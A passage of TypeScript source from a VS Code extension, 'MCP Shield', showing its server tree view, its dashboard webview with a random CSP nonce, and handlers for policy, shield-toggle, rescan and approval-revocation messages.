          ? new vscode.ThemeColor("statusBarItem.warningBackground")
          : undefined;
    }
  } catch {
    statusBarItem.text = "$(shield) MCP Shield";
    statusBarItem.backgroundColor = undefined;
  }
}

/**
 * Activity-bar tree listing discovered servers and their shield state.
 *
 * `package.json` declared a webview view here but no provider was ever
 * registered, so the panel rendered empty. A tree view is the right primitive for
 * this content anyway: it is a list of servers.
 */
class ShieldTreeProvider implements vscode.TreeDataProvider<ShieldTreeItem> {
  private _onDidChangeTreeData = new vscode.EventEmitter<void>();
  readonly onDidChangeTreeData = this._onDidChangeTreeData.event;

  constructor(private readonly context: vscode.ExtensionContext) {}

  refresh(): void {
    this._onDidChangeTreeData.fire();
  }

  getTreeItem(element: ShieldTreeItem): vscode.TreeItem {
    return element;
  }

  getChildren(element?: ShieldTreeItem): ShieldTreeItem[] {
    const configs = scanMcpConfigs(this.context);

    // Root level: one node per config file.
    if (!element) {
      if (configs.length === 0) {
        const empty = new ShieldTreeItem("No MCP configs found", vscode.TreeItemCollapsibleState.None);
        empty.iconPath = new vscode.ThemeIcon("info");
        return [empty];
      }
      return configs.map((config) => {
        const shielded = config.servers.filter((s) => s.isShielded).length;
        const item = new ShieldTreeItem(
          config.name,
          vscode.TreeItemCollapsibleState.Expanded
        );
        item.description = `${shielded}/${config.servers.length} shielded`;
        item.iconPath = new vscode.ThemeIcon("file-code");
        item.tooltip = config.path;
        item.configPath = config.path;
        return item;
      });
    }

    // Child level: servers within the selected config file.
    const config = configs.find((c) => c.path === element.configPath);
    if (!config) return [];

    return config.servers.map((server) => {
      const item = new ShieldTreeItem(server.id, vscode.TreeItemCollapsibleState.None);
      item.description = server.isShielded ? "shielded" : "unprotected";
      item.iconPath = new vscode.ThemeIcon(
        server.isShielded ? "shield" : "warning",
        server.isShielded
          ? undefined
          : new vscode.ThemeColor("problemsWarningIcon.foreground")
      );
      item.tooltip =
        `${server.id}\nTransport: ${server.transport}\n` +
        (server.transport === "http" ? `URL: ${server.url}` : `Command: ${server.command} ${server.args.join(" ")}`);
      item.command = { command: "mcp-shield.openDashboard", title: "Open Dashboard" };
      return item;
    });
  }
}

class ShieldTreeItem extends vscode.TreeItem {
  configPath?: string;
}

// ─────────────────────────────────────────────────────────────────────────────
// Dashboard webview
// ─────────────────────────────────────────────────────────────────────────────

/**
 * Cryptographically random nonce for the webview CSP.
 *
 * Must be unpredictable and fresh per render: a guessable or reused nonce would
 * let injected markup nominate itself as trusted script.
 */
function getNonce(): string {
  return crypto.randomBytes(16).toString("base64");
}

class DashboardPanel {
  public static currentPanel: DashboardPanel | undefined;
  public static readonly viewType = "mcpShieldDashboard";

  private readonly _panel: vscode.WebviewPanel;
  private readonly _context: vscode.ExtensionContext;
  private readonly _dbPath: string;
  private _disposables: vscode.Disposable[] = [];
  private _updateTimer: NodeJS.Timeout | null = null;
  /** Cache of the config scan so the refresh loop is not disk-bound. */
  private _configCache: DetectedConfig[] = [];
  private _configCacheAt = 0;

  public static createOrShow(context: vscode.ExtensionContext, dbPath: string) {
    const column = vscode.window.activeTextEditor?.viewColumn;

    if (DashboardPanel.currentPanel) {
      DashboardPanel.currentPanel._panel.reveal(column);
      return;
    }

    const panel = vscode.window.createWebviewPanel(
      DashboardPanel.viewType,
      "MCP Shield Dashboard",
      column || vscode.ViewColumn.One,
      {
        enableScripts: true,
        retainContextWhenHidden: true,
        // Restrict what the webview may load from disk to the extension's own
        // resources directory rather than the whole extension root.
        localResourceRoots: [vscode.Uri.joinPath(context.extensionUri, "resources")],
      }
    );

    DashboardPanel.currentPanel = new DashboardPanel(panel, context, dbPath);
  }

  private constructor(
    panel: vscode.WebviewPanel,
    context: vscode.ExtensionContext,
    dbPath: string
  ) {
    this._panel = panel;
    this._context = context;
    this._dbPath = dbPath;

    this._panel.webview.html = getWebviewContent(getNonce(), this._panel.webview.cspSource);

    this._panel.onDidDispose(() => this.dispose(), null, this._disposables);

    this._panel.webview.onDidReceiveMessage(
      async (message) => {
        try {
          await this._handleMessage(message);
        } catch (err: any) {
          log(`Webview message '${message?.command}' failed: ${err?.message ?? err}`);
          vscode.window.showErrorMessage(`MCP Shield: ${err?.message ?? err}`);
        }
      },
      null,
      this._disposables
    );

    void this._sendDataToWebview();

    // Poll for updates. The audit log is written by other processes, so there is
    // nothing to subscribe to; SQLite has no change notification across
    // processes. The interval is a deliberate simplicity-over-elegance tradeoff.
    this._updateTimer = setInterval(() => void this._sendDataToWebview(), 2000);
  }

  private async _handleMessage(message: any): Promise<void> {
    switch (message.command) {
      case "refresh":
        await this._sendDataToWebview();
        break;

      case "savePolicy":
        if (!dbInstance) return;
        await savePolicy(dbInstance, message.policy);
        vscode.window.showInformationMessage(
          `MCP Shield: policy updated for '${message.policy.server_id}'.`
        );
        await this._sendDataToWebview();
        break;

      case "toggleShield": {
        const result = await toggleShieldServer(
          this._context,
          message.configPath,
          message.serverId,
          message.shield
        );
        if (result.ok) {
          vscode.window.showInformationMessage(`MCP Shield: ${result.message}`);
        } else {
          vscode.window.showErrorMessage(`MCP Shield: ${result.message}`);
        }
        this._configCacheAt = 0; // force a fresh scan
        updateStatusBar(this._context);
        treeProvider?.refresh();
        await this._sendDataToWebview();
        break;
      }

      // Previously unhandled: the dashboard's "Rescan Configs" button posted
      // this command and the switch had no case for it, so the button did nothing.
      case "scan": {
        this._configCacheAt = 0;
        const configs = this._scanConfigsCached();
        updateStatusBar(this._context);
        treeProvider?.refresh();
        vscode.window.showInformationMessage(
          `MCP Shield: rescanned and found ${configs.length} config file(s).`
        );
        await this._sendDataToWebview();
        break;
      }

      case "revokeRule":
        if (!dbInstance) return;
        await deleteApprovalRule(dbInstance, message.serverId, message.toolName);
        vscode.window.showInformationMessage(
          `MCP Shield: standing approval for '${message.toolName}' revoked.`
        );
        await this._sendDataToWebview();
        break;

      case "runDemo":
        await runAttackDemo(this._context, this._dbPath);
        break;

      default:
        log(`Unknown webview command: ${message?.command}`);
    }
  }

  /** Config scanning hits the filesystem, so cache it between refresh ticks. */
  private _scanConfigsCached(): DetectedConfig[] {
    const CACHE_MS = 5000;
    if (Date.now() - this._configCacheAt > CACHE_MS) {
      this._configCache = scanMcpConfigs(this._context);
      this._configCacheAt = Date.now();
    }
    return this._configCache;
  }

  private async _sendDataToWebview(): Promise<void> {
    if (!dbInstance) return;

    try {
      const [logs, warnings, policies, rules] = await Promise.all([
        getAuditLogs(dbInstance, 200),
        getWarnings(dbInstance),
        getAllPolicies(dbInstance),
        getApprovalRules(dbInstance),
      ]);

      this._panel.webview.postMessage({
        type: "updateData",
        logs,
        warnings,
        policies,
        rules,
        configs: this._scanConfigsCached(),
      });
    } catch (err: any) {
      log(`Failed to refresh dashboard data: ${err.message}`);
    }
  }

  public dispose() {
    DashboardPanel.currentPanel = undefined;
    if (this._updateTimer) clearInterval(this._updateTimer);
    this._panel.dispose();
    while (this._disposables.length) {
      this._disposables.pop()?.dispose();
    }
  }
}
